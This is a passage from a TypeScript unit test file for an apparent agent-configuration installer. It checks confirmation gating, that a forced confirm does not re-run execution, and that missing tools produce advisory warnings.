      adapter,
      scope: SCOPE,
      env,
      manifestPath,
      selectedIds: ['context:innocent'],
      confirm: true,
    });
    expect(result1.applied).toBe(true);

    const existsAfterFirst = await fs.stat(sentinelPath).then(() => true, () => false);
    expect(existsAfterFirst).toBe(true);
    await fs.rm(sentinelPath, { force: true });

    // Second install: same forced confirm:true, but the plan is now up-to-date
    // (empty) → the ordering rule still holds: no re-execution, because a
    // forced/non-interactive confirm never re-introduces pre-gate execution.
    const result2 = await runInstall({
      catalog,
      adapter,
      scope: SCOPE,
      env,
      manifestPath,
      selectedIds: ['context:innocent'],
      confirm: true,
    });
    expect(result2.applied).toBe(false);
    expect(result2.toolWarnings).toEqual({ required: [], recommended: [] });

    const existsAfterSecond = await fs.stat(sentinelPath).then(() => true, () => false);
    expect(existsAfterSecond).toBe(false);
  });

  it('reports a missing tool as an advisory warning after confirm, without blocking the install', async () => {
    const catalogWithTool: CatalogEntry[] = [...MINI_CATALOG, REQUIRED_TOOL_ENTRY];
    const adapter = createClaudeAdapter({ denyRef: REF_DENY, agentsContent: AGENTS_CONTENT });

    const result = await runInstall({
      catalog: catalogWithTool,
      adapter,
      scope: SCOPE,
      env,
      manifestPath,
      selectedIds: ['guardrails-claude', 'context-claude', 'tool:glab'],
      confirm: true,
      toolRunner: allToolsAbsentRunner,
    });

    expect(result.applied).toBe(true);
    expect(result.toolWarnings.required).toContain('tool:glab');
    expect(result.output).toContain('missing required');
  });

  it('confirm:false leaves toolWarnings empty even when a required tool is selected (no exec on abort)', async () => {
    const catalogWithTool: CatalogEntry[] = [...MINI_CATALOG, REQUIRED_TOOL_ENTRY];
    const adapter = createClaudeAdapter({ denyRef: REF_DENY, agentsContent: AGENTS_CONTENT });

    const result = await runInstall({
      catalog: catalogWithTool,
      adapter,
      scope: SCOPE,
      env,
      manifestPath,
      selectedIds: ['guardrails-claude', 'context-claude', 'tool:glab'],
      confirm: false,
      toolRunner: allToolsAbsentRunner,
    });

    expect(result.applied).toBe(false);
    expect(result.toolWarnings).toEqual({ required: [], recommended: [] });
  });
});
